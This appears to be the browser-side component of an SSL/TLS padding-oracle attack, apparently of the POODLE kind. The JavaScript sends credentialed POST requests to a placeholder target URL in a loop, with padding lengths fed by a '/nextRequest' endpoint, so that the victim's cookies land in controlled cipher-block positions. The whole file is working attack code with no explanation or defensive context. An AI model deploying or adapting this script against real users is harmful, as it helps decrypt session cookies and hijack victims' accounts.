var urllen = 0;
var postlen = 26;
var delay = 10;

function strPad(n) {
    if (n > 0) {
        return Array(n + 1).join("A");
    } else {
        return "";
    }
}

function performSSLRequest() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = sslRequestHandler;
    xhr.withCredentials = true;
    xhr.open("POST", "###URL###?" + strPad(urllen));
    xhr.send(strPad(postlen));
}

function sslRequestHandler() {
    if (this.readyState == this.DONE) {
        queryNextRequest();
    }
}

function queryNextRequest() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = queryNextRequestHandler;
    xhr.open("GET", "/nextRequest");
    xhr.send(null);
}

function queryNextRequestHandler() {
    if (this.readyState == this.DONE) {
        var res = this.responseText.split(":");
        urllen = Number(res[0]);
        postlen = Number(res[1]);
        setTimeout(performSSLRequest, delay);
    }
}

performSSLRequest();
